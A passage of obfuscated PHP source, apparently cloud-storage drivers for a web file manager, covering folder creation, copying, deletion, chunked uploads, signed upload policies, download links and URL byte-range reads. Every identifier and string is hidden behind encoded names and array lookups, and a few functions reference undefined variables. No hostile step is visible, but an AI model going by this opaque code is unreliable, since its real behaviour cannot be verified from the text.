$ò•Ø´›© = REPEAT_RENAME) { if ($this->setContent($öæì¯Êí, $àî´äÊ)) { return $this->getPathOuter($öæì¯Êí); } return !1; } public function mkdir($´ÌøÍà®, $¥ôøØ‹Ë = REPEAT_SKIP) { $©»ïÁĞ© =& $_SERVER[‚ûòÉ˜ş]; $ûÁÔ€·É = trim($´ÌøÍà®, $©»ïÁĞ©[8]); if ($this->_isFolder($ûÁÔ€·É)) { return $this->getPathOuter($ûÁÔ€·É); } $«œÕƒÍƒ = array($©»ïÁĞ©[1485]); $šÇ±àÍê = $this->ussRequest($ûÁÔ€·É, $©»ïÁĞ©[251], !1, $«œÕƒÍƒ); return $šÇ±àÍê[$©»ïÁĞ©[1253]] ? $this->getPathOuter($ûÁÔ€·É) : !1; } public function copyFile($ìş¯ıÆ, $¦š¸»Åµ) { $Ò‡«†Ö” =& $_SERVER[‚ûòÉ˜ş]; $»ÑÑéí¢ = array($Ò‡«†Ö”[1486] . "\x2f{$this->bucket}\x2f{$ìş¯ıÆ}", $Ò‡«†Ö”[1487]); $©ä›  = $this->ussRequest($¦š¸»Åµ, $Ò‡«†Ö”[253], !1, $»ÑÑéí¢); return $©ä› [$Ò‡«†Ö”[1253]] ? !0 : $this->getPathOuter($¦š¸»Åµ); } public function moveFile($Ë×”á…û, $¦®Ù¢š±) { $‹ŒÉä€è =& $_SERVER[‚ûòÉ˜ş]; $°€”ö™© = array($‹ŒÉä€è[1488] . "\57{$this->bucket}\x2f{$Ë×”á…û}", $‹ŒÉä€è[1487]); $ÕÃÓìïà = $this->ussRequest($¦®Ù¢š±, $‹ŒÉä€è[253], !1, $°€”ö™©); return $ÕÃÓìïà[$‹ŒÉä€è[1253]] ? !0 : $this->getPathOuter($¦®Ù¢š±); } public function delFile($§ôµØôñ) { $Ÿ‘Ôô¥à =& $_SERVER[‚ûòÉ˜ş]; $ò ğ¬Â§ = $this->ussRequest($§ôµØôñ, $Ÿ‘Ôô¥à[1489]); return $ò ğ¬Â§[$Ÿ‘Ôô¥à[1253]] ? !0 : !1; } public function delFolder($Úà‹§Í) { $ŠÏèäÔ» =& $_SERVER[‚ûòÉ˜ş]; if (!$this->exist($Úà‹§Í)) { return !0; } $this->listItemCache = !1; $ı¨Ú”º = $Ó¹Û¦Úò = array(); $this->fileList($Úà‹§Í, $ı¨Ú”º, $Ó¹Û¦Úò, !0); $this->listItemCache = !0; foreach ($Ó¹Û¦Úò as $¹«ø–°Ø) { $ù©®Œ”ã = $this->ussRequest($¹«ø–°Ø[$ŠÏèäÔ»[42]], $ŠÏèäÔ»[1489]); if (!$ù©®Œ”ã[$ŠÏèäÔ»[1253]]) { return !1; } } foreach ($ı¨Ú”º as $şÈå¸ˆ”) { $ù©®Œ”ã = $this->ussRequest($şÈå¸ˆ”, $ŠÏèäÔ»[1489]); if (!$ù©®Œ”ã[$ŠÏèäÔ»[1253]]) { return !1; } } $ù©®Œ”ã = $this->ussRequest($Úà‹§Í, $ŠÏèäÔ»[1489]); return $ù©®Œ”ã[$ŠÏèäÔ»[1253]]; } public function rename($ÒÇ¶âšÕ, $…ì´Ğ²•) { if ($this->isFile($ÒÇ¶âšÕ)) { $…ì´Ğ²• = get_path_father($ÒÇ¶âšÕ) . $…ì´Ğ²•; return $this->moveFile($ÒÇ¶âšÕ, $…ì´Ğ²•); } return $this->renameObject($ÒÇ¶âšÕ, $…ì´Ğ²•); } public function fileInfo($³ªª×Àï, $Ôù«Îùì = false, $÷·±È¢Ü = array()) { $Ä šÖåà =& $_SERVER[‚ûòÉ˜ş]; $±“ŞË¢í = array($Ä šÖåà[42] => $this->pathThis($³ªª×Àï), $Ä šÖåà[94] => $this->getPathOuter($Ä šÖåà[8] . $³ªª×Àï), $Ä šÖåà[43] => $Ä šÖåà[224], $Ä šÖåà[86] => isset($÷·±È¢Ü[$Ä šÖåà[86]]) ? $÷·±È¢Ü[$Ä šÖåà[86]] : 0, $Ä šÖåà[185] => $this->ext($³ªª×Àï)); if ($Ôù«Îùì) { return $±“ŞË¢í; } $±“ŞË¢í[$Ä šÖåà[225]] = $±“ŞË¢í[$Ä šÖåà[95]] = 0; $±“ŞË¢í[$Ä šÖåà[226]] = $±“ŞË¢í[$Ä šÖåà[227]] = !0; if (empty($÷·±È¢Ü)) { $÷·±È¢Ü = $this->objectMeta($³ªª×Àï); if (!$÷·±È¢Ü) { return $±“ŞË¢í; } } $±“ŞË¢í[$Ä šÖåà[225]] = intval($÷·±È¢Ü[$Ä šÖåà[1490]]); $±“ŞË¢í[$Ä šÖåà[95]] = intval($÷·±È¢Ü[$Ä šÖåà[1491]]); $±“ŞË¢í[$Ä šÖåà[86]] = $÷·±È¢Ü[$Ä šÖåà[86]]; return $±“ŞË¢í; } public function folderInfo($ ½ù©ä‹, $áì˜µ® = false) { $¡ŒèÒ²¤ =& $_SERVER[‚ûòÉ˜ş]; $ïÏæ‚´Õ = array($¡ŒèÒ²¤[42] => $this->pathThis($ ½ù©ä‹), $¡ŒèÒ²¤[94] => $this->getPathOuter($¡ŒèÒ²¤[8] . $ ½ù©ä‹), $¡ŒèÒ²¤[43] => $¡ŒèÒ²¤[85]); if ($áì˜µ®) { return $ïÏæ‚´Õ; } $ïÏæ‚´Õ[$¡ŒèÒ²¤[225]] = $ïÏæ‚´Õ[$¡ŒèÒ²¤[95]] = 0; $ïÏæ‚´Õ[$¡ŒèÒ²¤[226]] = $ïÏæ‚´Õ[$¡ŒèÒ²¤[227]] = !0; if (empty($ÌÄñÍÆÓ)) { $ÌÄñÍÆÓ = $this->objectMeta($ ½ù©ä‹); if (!$ÌÄñÍÆÓ) { return $ïÏæ‚´Õ; } } $ïÏæ‚´Õ[$¡ŒèÒ²¤[225]] = intval($ÌÄñÍÆÓ[$¡ŒèÒ²¤[1490]]); $ïÏæ‚´Õ[$¡ŒèÒ²¤[95]] = intval($ÌÄñÍÆÓ[$¡ŒèÒ²¤[1491]]); return $ïÏæ‚´Õ; } private function listObjs($…ŞŒş“Ó, $†ÁŞ÷‹« = 0, $°åë¸Ãš = 1000) { $óŒî„ªã =& $_SERVER[‚ûòÉ˜ş]; $×¹£¾Ÿ• = array($óŒî„ªã[1492], $óŒî„ªã[1493] . $°åë¸Ãš); if ($†ÁŞ÷‹«) { $×¹£¾Ÿ•[] = $óŒî„ªã[1494] . $†ÁŞ÷‹«; } $ïıÄæÀÚ = $this->ussRequest($…ŞŒş“Ó, $óŒî„ªã[255], !1, $×¹£¾Ÿ•); return !$ïıÄæÀÚ[$óŒî„ªã[1253]] ? !1 : $ïıÄæÀÚ[$óŒî„ªã[1243]]; } private function fileList($ì›Á¬Ñ°, &$‰–æÄºÈ, &$ÔÏìê›…, $ËóÜÃ¨ß = false) { $ÂÅÜ³©á =& $_SERVER[‚ûòÉ˜ş]; $®ø–óç£ = $ÂÅÜ³©á[12]; $Œ‘ÓİÕ¦ = 1000; $¡îÉ÷ˆå = rtrim($ì›Á¬Ñ°, $ÂÅÜ³©á[8]) . $ÂÅÜ³©á[8]; while (!0) { check_abort(); $…ÒÎü† = $this->listObjs($ì›Á¬Ñ°, $®ø–óç£, $Œ‘ÓİÕ¦); if (!$…ÒÎü†) { return !1; } $®ø–óç£ = isset($…ÒÎü†[$ÂÅÜ³©á[1495]]) ? $…ÒÎü†[$ÂÅÜ³©á[1495]] : $ÂÅÜ³©á[12]; $ç±¡©ú† = isset($…ÒÎü†[$ÂÅÜ³©á[1496]]) ? $…ÒÎü†[$ÂÅÜ³©á[1496]] : array(); foreach ($ç±¡©ú† as $£Õ×ßëë) { $ôˆÅ‹¶ó = $£Õ×ßëë[$ÂÅÜ³©á[43]] == $ÂÅÜ³©á[85] ? !0 : !1; $¥â¾ìù = ltrim($¡îÉ÷ˆå . $£Õ×ßëë[$ÂÅÜ³©á[42]], $ÂÅÜ³©á[8]) . ($ôˆÅ‹¶ó ? $ÂÅÜ³©á[8] : $ÂÅÜ³©á[12]); $á»óÆûÏ = array($ÂÅÜ³©á[42] => $¥â¾ìù, $ÂÅÜ³©á[43] => $ôˆÅ‹¶ó ? $ÂÅÜ³©á[85] : $ÂÅÜ³©á[224], $ÂÅÜ³©á[86] => $£Õ×ßëë[$ÂÅÜ³©á[390]], $ÂÅÜ³©á[1491] => $£Õ×ßëë[$ÂÅÜ³©á[1497]]); $this->cacheMethodInfoSet($¥â¾ìù, $ôˆÅ‹¶ó, $á»óÆûÏ); if ($ôˆÅ‹¶ó) { $‰–æÄºÈ[] = $¥â¾ìù; if ($ËóÜÃ¨ß) { $this->fileList($¥â¾ìù, $‰–æÄºÈ, $ÔÏìê›…, $ËóÜÃ¨ß); } continue; } $ÔÏìê›…[] = $á»óÆûÏ; } if (count($ç±¡©ú†) < $Œ‘ÓİÕ¦) { break; } } $this->cacheMethodInfoSet($ì›Á¬Ñ°, !0); } public function listPath($² ¢Æô, $¡Ü£¦ã = false) { $êá’æëå =& $_SERVER[‚ûòÉ˜ş]; $äÓ‘„´© = $Ø°ÒŸ™ = array(); $this->fileList($² ¢Æô, $äÓ‘„´©, $Ø°ÒŸ™); foreach ($äÓ‘„´© as $şõ³”® => $—ö‰îûÖ) { $äÓ‘„´©[$şõ³”®] = $this->folderInfo($—ö‰îûÖ, $¡Ü£¦ã); } foreach ($Ø°ÒŸ™ as $şõ³”® => $—ö‰îûÖ) { $Ø°ÒŸ™[$şõ³”®] = $this->fileInfo($—ö‰îûÖ[$êá’æëå[42]], $¡Ü£¦ã, $—ö‰îûÖ); } return array($êá’æëå[92] => $äÓ‘„´©, $êá’æëå[93] => $Ø°ÒŸ™); } public function has($Ñ„çÎí, $†Ê±ÁÍ = false, $¿…î¬Ú = true) { $ã®‡ºÓö =& $_SERVER[‚ûòÉ˜ş]; $åëÇí­” = $ã®‡ºÓö[12]; $îıÔçà = 500; $Ú¢·çÁ = 0; $‡Œş«¸ƒ = 0; $’‹Ø™œ¹ = rtrim($Ñ„çÎí, $ã®‡ºÓö[8]) . $ã®‡ºÓö[8]; while (!0) { check_abort(); $¾…ÍôÛï = $this->listObjs($Ñ„çÎí, $åëÇí­”, $îıÔçà); if (!$¾…ÍôÛï) { return !1; } $åëÇí­” = isset($¾…ÍôÛï[$ã®‡ºÓö[1495]]) ? $¾…ÍôÛï[$ã®‡ºÓö[1495]] : $ã®‡ºÓö[12]; $æ‹şäÆö = isset($¾…ÍôÛï[$ã®‡ºÓö[1496]]) ? $¾…ÍôÛï[$ã®‡ºÓö[1496]] : array(); if (empty($æ‹şäÆö)) { break; } $â§Å¯¼Ì = array_filter($æ‹şäÆö, function ($§à“á™Æ) { $ÃøÌĞš =& $_SERVER[‚ûòÉ˜ş]; return $§à“á™Æ[$ÃøÌĞš[43]] == $ÃøÌĞš[85]; }); $Î¬ıÛˆ¼ = count($æ‹şäÆö); $â§Å¯¼Ì = count($â§Å¯¼Ì); $„Æ«Ó¬Ã = $Î¬ıÛˆ¼ - $â§Å¯¼Ì; if ($†Ê±ÁÍ) { $‡Œş«¸ƒ += $â§Å¯¼Ì; $Ú¢·çÁ += $„Æ«Ó¬Ã; if ($Î¬ıÛˆ¼ < $îıÔçà) { break; } continue; } if ($¿…î¬Ú) { if ($„Æ«Ó¬Ã) { return !0; } } else { if ($â§Å¯¼Ì) { return !0; } } if ($Î¬ıÛˆ¼ < $îıÔçà) { break; } } if ($†Ê±ÁÍ) { return array($ã®‡ºÓö[233] => $Ú¢·çÁ, $ã®‡ºÓö[234] => $‡Œş«¸ƒ); } return !1; } public function listAll($‚ç‰«œ¥) { $’Ìïóğ“ =& $_SERVER[‚ûòÉ˜ş]; $¡Äë‘ú = $»Şˆ®¥ò = array(); $this->fileList($‚ç‰«œ¥, $¡Äë‘ú, $»Şˆ®¥ò, !0); $Àö¾×Š… = array_to_keyvalue($»Şˆ®¥ò, $’Ìïóğ“[42]); foreach ($¡Äë‘ú as $Ò‘§êè¡) { if (is_string($Ò‘§êè¡)) { $Àö¾×Š…[$Ò‘§êè¡] = array($’Ìïóğ“[86] => 0); } } return $this->listAllFiles($‚ç‰«œ¥, $Àö¾×Š…); } public function canRead($š¼§ïŒ•) { return $this->exist($š¼§ïŒ•) ? !0 : !1; } public function canWrite($´©ëš†—) { return $this->exist($´©ëš†—) ? !0 : !1; } public function getContent($âË‡ñŒô) { return $this->fileSubstr($âË‡ñŒô, 0, -1); } public function setContent($’«Ò”™, $ó•õ¥ = '') { $ÄòÈ³ø÷ =& $_SERVER[‚ûòÉ˜ş]; if (!$ó•õ¥) { $ïÎËŒá‰ = $this->ussRequest($’«Ò”™, $ÄòÈ³ø÷[251]); return $ïÎËŒá‰[$ÄòÈ³ø÷[1253]]; } $öÃ£ ²ğ = $this->tempFile($this->pathThis($’«Ò”™)); file_put_contents($öÃ£ ²ğ, $ó•õ¥); if ($this->upload($’«Ò”™, $öÃ£ ²ğ)) { $this->tempFileRemve($öÃ£ ²ğ); return !0; } return !1; } public function fileSubstr($²¶Û”ñˆ, $§ä„º¹ß, $¥“õøµ) { $æâ÷ï¸ =& $_SERVER[‚ûòÉ˜ş]; if (!($˜£›Àï– = $this->link($²¶Û”ñˆ))) { return !1; } $©‹³ˆÕ¯ = !1; if ($¥“õøµ > 0) { $¡îÆ²ä = $§ä„º¹ß + $¥“õøµ - 1; $©‹³ˆÕ¯ = array($æâ÷ï¸[1458] . $§ä„º¹ß . $æâ÷ï¸[438] . $¡îÆ²ä); } $ºúö¨ª‡ = url_request($˜£›Àï–, $æâ÷ï¸[255], !1, $©‹³ˆÕ¯); return $ºúö¨ª‡[$æâ÷ï¸[790]] ? $ºúö¨ª‡[$æâ÷ï¸[1243]] : !1; } public function upload($ıŒŠöı, $†Å€äø, $‘Äò×²µ = false, $ü¢¬–Å = REPEAT_REPLACE) { $Í¸ıÏ˜ =& $_SERVER[‚ûòÉ˜ş]; $°úéË¢“ = IO::size($†Å€äø); if ($°úéË¢“ <= 1024 * 1024 * 200) { $¸¢Øü±À = array($Í¸ıÏ˜[1498] . $†Å€äø); $ú‰šöÁø = $this->ussRequest($ıŒŠöı, $Í¸ıÏ˜[253], $¸¢Øü±À); return $ú‰šöÁø[$Í¸ıÏ˜[1253]] ? $this->getPathOuter($ıŒŠöı) : !1; } $”ÕÇÖí² = 1024 * 1024 * 10; $¥ÖœÀı  = array($Í¸ıÏ˜[1499], $Í¸ıÏ˜[1500] . $°úéË¢“, $Í¸ıÏ˜[1501], $Í¸ıÏ˜[1502] . $”ÕÇÖí²); $ú‰šöÁø = $this->ussRequest($ıŒŠöı, $Í¸ıÏ˜[253], !1, $¥ÖœÀı ); if (!$ú‰šöÁø[$Í¸ıÏ˜[1253]]) { return !1; } $¡ÅÓİ¨¡ = $ú‰šöÁø[$Í¸ıÏ˜[1243]]; $ìÍÛ¯Ÿœ = 0; $©†„ıøÊ = $¡ÅÓİ¨¡[$Í¸ıÏ˜[1503]]; $åé³Ã›› = fopen($†Å€äø, $Í¸ıÏ˜[1407]); if (!$åé³Ã››) { return !1; } do { $ÕÚƒŒÃò = $¡ÅÓİ¨¡[$Í¸ıÏ˜[1504]]; fseek_64($åé³Ã››, $ìÍÛ¯Ÿœ); $üÛœ ªÔ = fread($åé³Ã››, $ÕÚƒŒÃò); $³ÂÌ×Ãª = 0; do { $³ÂÌ×Ãª++; $¡ÅÓİ¨¡ = $this->uploadPart($ıŒŠöı, $¡ÅÓİ¨¡, $üÛœ ªÔ); } while (!$¡ÅÓİ¨¡ && $³ÂÌ×Ãª < 3); if (!$¡ÅÓİ¨¡) { return !1; } $©†„ıøÊ = $¡ÅÓİ¨¡[$Í¸ıÏ˜[1503]]; $ìÍÛ¯Ÿœ += $ÕÚƒŒÃò; } while ($©†„ıøÊ != -1); fclose($åé³Ã››); $¥ÖœÀı  = array($Í¸ıÏ˜[1505], $Í¸ıÏ˜[1506] . $¡ÅÓİ¨¡[$Í¸ıÏ˜[1507]], $Í¸ıÏ˜[1501]); $ú‰šöÁø = $this->ussRequest($ıŒŠöı, $Í¸ıÏ˜[253], !1, $¥ÖœÀı ); return $ú‰šöÁø[$Í¸ıÏ˜[1253]] ? $this->getPathOuter($ğÓÂ–³½) : !1; } private function uploadPart($øÍŸ—ÏÏ, $İĞ·Û÷, &$¿ÖÈ‘ÒÓ) { $æÏı‡°º =& $_SERVER[‚ûòÉ˜ş]; $Ğò°ù™· = array($æÏı‡°º[1508], $æÏı‡°º[1506] . $İĞ·Û÷[$æÏı‡°º[1507]], $æÏı‡°º[1509] . $İĞ·Û÷[$æÏı‡°º[1503]], $æÏı‡°º[153] . $İĞ·Û÷[$æÏı‡°º[1504]]); $£±¥Â÷Ò = $this->ussRequest($øÍŸ—ÏÏ, $æÏı‡°º[253], $¿ÖÈ‘ÒÓ, $Ğò°ù™·); return !$£±¥Â÷Ò[$æÏı‡°º[1253]] ? $£±¥Â÷Ò[$æÏı‡°º[1253]] : $£±¥Â÷Ò[$æÏı‡°º[1243]]; } public function uploadFormData($»×ˆ¤Ë³, $Ø›Èí°„ = 3600) { return $this->uploadPolicy($»×ˆ¤Ë³, $Ø›Èí°„); } public function multiUploadFormData($§ÒìòÅ¼, $áéŸØ· = 3600) { $Âš­ ÛØ =& $_SERVER[‚ûòÉ˜ş]; $î‚šìÃü = (int) $GLOBALS[$Âš­ ÛØ[7]][$Âš­ ÛØ[86]]; return $this->uploadPolicy($§ÒìòÅ¼, $áéŸØ·, $î‚šìÃü); } private function uploadPolicy($ÎÌ¦Á, $Š²¹ûåã = 3600, $¡÷É“«— = 0) { $’ŠÀîØœ =& $_SERVER[‚ûòÉ˜ş]; $„Ëü‘‡“ = $’ŠÀîØœ[8] . $this->bucket; $›…¥×Š = gmdate($’ŠÀîØœ[1443]); $£ğ÷°¬ = array($’ŠÀîØœ[1510] => $this->bucket, $’ŠÀîØœ[1511] => $ÎÌ¦Á, $’ŠÀîØœ[1512] => time() + $Š²¹ûåã, $’ŠÀîØœ[1513] => $›…¥×Š); if ($¡÷É“«—) { $£ğ÷°¬[$’ŠÀîØœ[1424]] = $¡÷É“«—; } $¶áçÒÖ¥ = base64_encode(json_encode($£ğ÷°¬)); $¥®©‰İã = base64_encode(hash_hmac($’ŠÀîØœ[1480], "\120\117\123\x54\46{$„Ëü‘‡“}\x26{$›…¥×Š}\46{$¶áçÒÖ¥}", md5("{$this->userpass}"), !0)); $•â§Ÿî• = array($’ŠÀîØœ[285] => $¶áçÒÖ¥, $’ŠÀîØœ[1514] => "\125\x50\x59\x55\116\40{$this->username}\x3a{$¥®©‰İã}", $’ŠÀîØœ[206] => $this->endpoint . $„Ëü‘‡“); return $•â§Ÿî•; } public function download($¬–Óèé–, $ó¨×±—«) { $Š‹ïÄÂç = IO::getPathInner(IO::mkfile($ó¨×±—«)); if (!($¼Şß²ƒ“ = $this->link($¬–Óèé–))) { return !1; } $şû§¯˜ = 0; $ï¸¬ûĞÕ = 1024 * 200; $À€öëÖà = fopen($Š‹ïÄÂç, $_SERVER[‚ûòÉ˜ş][1464]); while (!0) { $ÒšÚÛˆÒ = $this->fileSubstr($¬–Óèé–, $şû§¯˜, $ï¸¬ûĞÕ); if ($ÒšÚÛˆÒ === !1) { return !1; } fwrite($À€öëÖà, $ÒšÚÛˆÒ); $şû§¯˜ += $ï¸¬ûĞÕ; if (strlen($ÒšÚÛˆÒ) < $ï¸¬ûĞÕ) { break; } } fclose($À€öëÖà); return $ó¨×±—«; } public function link($âİÑˆôÅ, $‹ç·­÷ñ = array()) { $œ²ÔÔ±õ =& $_SERVER[‚ûòÉ˜ş]; $âİÑˆôÅ = trim($âİÑˆôÅ, $œ²ÔÔ±õ[8]); if (!empty($this->token)) { $¯È½«£š = strtotime(date($œ²ÔÔ±õ[1515])); $ˆ”Èø©Œ = substr(md5($this->token . $œ²ÔÔ±õ[337] . $¯È½«£š . $œ²ÔÔ±õ[1516] . $âİÑˆôÅ), 12, 8) . $¯È½«£š; $‹ç·­÷ñ[] = $œ²ÔÔ±õ[1517] . $ˆ”Èø©Œ; } $œì–·¤– = !empty($‹ç·­÷ñ) ? $œ²ÔÔ±õ[83] . implode($œ²ÔÔ±õ[337], $‹ç·­÷ñ) : $œ²ÔÔ±õ[12]; return $this->getHost() . $œ²ÔÔ±õ[8] . $âİÑˆôÅ . $œì–·¤–; } public function fileOut($ÈÌå‚ÇÃ, $Òå•Òì­ = false, $»ŠíÜì© = false, $É»¦¡Õ» = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ÈÌå‚ÇÃ, $Òå•Òì­, $»ŠíÜì©, $É»¦¡Õ»); } if (!$»ŠíÜì©) { $»ŠíÜì© = $this->pathThis($ÈÌå‚ÇÃ); } $‡ì°ë¬¶ = $Òå•Òì­ ? array($_SERVER[‚ûòÉ˜ş][1518] . rawurlencode($»ŠíÜì©)) : array(); $ºöòä¿é = $this->link($ÈÌå‚ÇÃ, $‡ì°ë¬¶); $this->fileOutLink($ºöòä¿é); } public function fileOutServer($˜½è—Å¤, $¸›Øäü• = false, $„ ¸ËÄ = false, $ëËÏİ¦” = '') { parent::fileOut($˜½è—Å¤, $¸›Øäü•, $„ ¸ËÄ, $ëËÏİ¦”); } public function fileOutImage($ı€ñŸ, $Ê®›¡öÌ = 250) { $ßæÍ Ïí = $this->link($ı€ñŸ . $_SERVER[‚ûòÉ˜ş][1519] . $Ê®›¡öÌ); $this->fileOutLink($ßæÍ Ïí); } public function fileOutImageServer($ûÇøıŒ», $£ÈÇóèŸ = 250) { parent::fileOutImage($ûÇøıŒ», $£ÈÇóèŸ); } public function hashMd5($û¿Áâšù) { $™ğ‚ï÷ =& $_SERVER[‚ûòÉ˜ş]; $æÉ’¶¿ˆ = $this->_objectMeta($û¿Áâšù); return isset($æÉ’¶¿ˆ[$™ğ‚ï÷[238]]) ? $æÉ’¶¿ˆ[$™ğ‚ï÷[238]] : !1; } public function size($»ÄÙÖÖÊ) { $×¶´Œ±ò = $this->objectMeta($»ÄÙÖÖÊ); return $×¶´Œ±ò ? $×¶´Œ±ò[$_SERVER[‚ûòÉ˜ş][86]] : 0; } public function info($Í‹„ı½ô) { if ($this->isFolder($Í‹„ı½ô)) { return $this->folderInfo($Í‹„ı½ô); } else { if ($this->isFile($Í‹„ı½ô)) { return $this->fileInfo($Í‹„ı½ô); } } return !1; } public function exist($¶ı»©¼ê) { return $this->isFile($¶ı»©¼ê) || $this->isFolder($¶ı»©¼ê); } public function isFile($£òôË´ƒ) { return !$this->isFolder($£òôË´ƒ) && $this->objectMeta($£òôË´ƒ); } public function isFolder($•ğç³Ù¼) { return $this->cacheMethod($_SERVER[‚ûòÉ˜ş][176], $•ğç³Ù¼); } protected function objectMeta($ŠƒÆÍ›Ó) { return $this->cacheMethod($_SERVER[‚ûòÉ˜ş][178], $ŠƒÆÍ›Ó); } protected function _objectMeta($÷Æá°Ÿ®) { $Ôõ–åÙú =& $_SERVER[‚ûòÉ˜ş]; if ($÷Æá°Ÿ® == $Ôõ–åÙú[12] || $÷Æá°Ÿ® == $Ôõ–åÙú[8]) { return array(); } $çùØ­à = $this->ussRequest($÷Æá°Ÿ®, $Ôõ–åÙú[1520]); if (!$çùØ­à[$Ôõ–åÙú[1253]]) { return null; } $ùÃ¶¦À© = isset($çùØ­à[$Ôõ–åÙú[1243]]) ? $çùØ­à[$Ôõ–åÙú[1243]] : array(); if (!isset($ùÃ¶¦À©[$Ôõ–åÙú[1521]])) { return null; } $ü¦õ¿ÎÀ = array($Ôõ–åÙú[43] => isset($ùÃ¶¦À©[$Ôõ–åÙú[1521]]) ? $ùÃ¶¦À©[$Ôõ–åÙú[1521]] : null, $Ôõ–åÙú[86] => isset($ùÃ¶¦À©[$Ôõ–åÙú[1522]]) ? $ùÃ¶¦À©[$Ôõ–åÙú[1522]] : null, $Ôõ–åÙú[238] => isset($ùÃ¶¦À©[$Ôõ–åÙú[1523]]) ? $ùÃ¶¦À©[$Ôõ–åÙú[1523]] : null, $Ôõ–åÙú[1490] => isset($ùÃ¶¦À©[$Ôõ–åÙú[1524]]) ? $ùÃ¶¦À©[$Ôõ–åÙú[1524]] : null); $ü¦õ¿ÎÀ[$Ôõ–åÙú[1491]] = isset($ùÃ¶¦À©[$Ôõ–åÙú[1525]]) ? strtotime($ùÃ¶¦À©[$Ôõ–åÙú[1525]]) : $ü¦õ¿ÎÀ[$Ôõ–åÙú[1490]]; return $ü¦õ¿ÎÀ; } protected function _isFolder($‹ÈğóÎõ) { $ıÉ¯óÙ =& $_SERVER[‚ûòÉ˜ş]; if ($‹ÈğóÎõ == $ıÉ¯óÙ[12] || $‹ÈğóÎõ == $ıÉ¯óÙ[8]) { return !0; } $¥Â§£§ö = $this->_objectMeta($‹ÈğóÎõ); return isset($¥Â§£§ö[$ıÉ¯óÙ[43]]) && $¥Â§£§ö[$ıÉ¯óÙ[43]] == $ıÉ¯óÙ[85] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Ëò•âÅ• = false) { } public function exist($§Âˆ“³·) { $òÌ×ç†Ÿ = $this->info($§Âˆ“³·); return $òÌ×ç†Ÿ[$_SERVER[‚ûòÉ˜ş][226]]; } public function isFile($ı…‰™İ©) { $ŠÁ±¦µ¯ = $this->info($ı…‰™İ©); return $ŠÁ±¦µ¯[$_SERVER[‚ûòÉ˜ş][226]]; } public function isFolder($§„È‡) { return !1; } public function size($Ì®¯«¯•) { $ÚÂÒÕş = $this->info($Ì®¯«¯•); return $ÚÂÒÕş[$_SERVER[‚ûòÉ˜ş][86]]; } public function info($ÒäşĞò¥) { return $this->infoParse($ÒäşĞò¥); } public function infoAuth($êå¿õ£) { return $this->infoParse($êå¿õ£); } public function infoWithChildren($ÀÂ¥ê ) { return $this->infoParse($ÀÂ¥ê ); } public function infoFull($Ë©Ã„ûœ) { return $this->infoParse($Ë©Ã„ûœ); } private function infoParse($Ø¨©) { $ÁÌõ¿¨ú =& $_SERVER[‚ûòÉ˜ş]; $Îü¢äÎÜ = $this->header($Ø¨©); if (!$Îü¢äÎÜ || !$Îü¢äÎÜ[$ÁÌõ¿¨ú[790]]) { return !1; } $ßâÚÚ×ú = _get($Îü¢äÎÜ, $ÁÌõ¿¨ú[390], 0); $™óÜÆ–Î = array($ÁÌõ¿¨ú[42] => $Îü¢äÎÜ[$ÁÌõ¿¨ú[42]], $ÁÌõ¿¨ú[94] => $Ø¨©, $ÁÌõ¿¨ú[43] => $ÁÌõ¿¨ú[224], $ÁÌõ¿¨ú[86] => intval($ßâÚÚ×ú), $ÁÌõ¿¨ú[185] => get_path_ext($Îü¢äÎÜ[$ÁÌõ¿¨ú[42]]), $ÁÌõ¿¨ú[1404] => $ßâÚÚ×ú > 0 && $Îü¢äÎÜ[$ÁÌõ¿¨ú[1526]], $ÁÌõ¿¨ú[1405] => !1); return $™óÜÆ–Î; } private function header($íÈ©šü) { $˜×¾ï° =& $_SERVER[‚ûòÉ˜ş]; if (isset(self::$_cacheHeader[$íÈ©šü])) { return self::$_cacheHeader[$íÈ©šü]; } $ç¸—¹ò† = isset($GLOBALS[$˜×¾ï°[1527]]) ? $GLOBALS[$˜×¾ï°[1527]] : !1; $GLOBALS[$˜×¾ï°[1527]] = !0; self::$_cacheHeader[$íÈ©šü] = url_header($íÈ©šü); $GLOBALS[$˜×¾ï°[1527]] = $ç¸—¹ò†; return self::$_cacheHeader[$íÈ©šü]; } public function hashSimple($¡â¿Ş, $²û°²ì— = false) { $¬à›É =& $_SERVER[‚ûòÉ˜ş]; $ßé¾ë•º = $this->info($¡â¿Ş); if (!$ßé¾ë•º || !$ßé¾ë•º[$¬à›É[226]]) { return !1; } $¼£‰£‡ = $ßé¾ë•º[$¬à›É[86]]; $™±ñÄú = 200; $º‡†î˜ó = 50; if ($¼£‰£‡ <= $™±ñÄú * $º‡†î˜ó) { return md5($this->fileSubstr($¡â¿Ş, 0, $¼£‰£‡)) . $¼£‰£‡; } $Ç¢ÊÃ÷ = intval($¼£‰£‡ / $º‡†î˜ó); $î„õ©…ì = $¬à›É[12]; $ñ§©òœ® = timeFloat(); $Ëµ¯ã‘¤ = 15; for ($İŞåŒ¡õ = 0; $İŞåŒ¡õ < $º‡†î˜ó; $İŞåŒ¡õ++) { if (timeFloat() - $ñ§©òœ® > $Ëµ¯ã‘¤) { return !1; } $ÚÖ°ß»Ğ = $this->fileSubstr($¡â¿Ş, $Ç¢ÊÃ÷ * $İŞåŒ¡õ, $™±ñÄú); if (!$ÚÖ°ß»Ğ) { return !1; } $î„õ©…ì .= $ÚÖ°ß»Ğ; } $î„õ©…ì .= $this->fileSubstr($¡â¿Ş, $¼£‰£‡ - $™±ñÄú, $™±ñÄú); return md5($î„õ©…ì) . $¼£‰£‡; } public function getContent($¨Äšé¨…) { return $this->fileSubstr($¨Äšé¨…); } public function fileSubstr($÷«ïúÁñ, $»¹»”ü = 0, $¯«„Òö­ = -1) { $éş’Å¯ì =& $_SERVER[‚ûòÉ˜ş]; $íãüƒ‰“ = $this->info($÷«ïúÁñ); if (!$íãüƒ‰“ || !$íãüƒ‰“[$éş’Å¯ì[226]] && $íãüƒ‰“[$éş’Å¯ì[86]] > 1024 * 1024 * 10) { return !1; } if ($¯«„Òö­ === -1) { $¯«„Òö­ = $íãüƒ‰“[$éş’Å¯ì[86]]; } if ($¯«„Òö­ == 0) { return $éş’Å¯ì[12]; } $ ”Òİ£æ = array($éş’Å¯ì[1528] . $»¹»”ü . $éş’Å¯ì[822] . ($»¹»”ü + $¯«„Òö­ - 1)); $“ûâ”œ¨ = url_request($÷«ïúÁñ, $éş’Å¯ì[255], !1, $ ”Òİ£æ, !1, !1, 30); return $“ûâ”œ¨[$éş’Å¯ì[1243]] ? $“ûâ”œ¨[$éş’Å¯ì[1243]] : 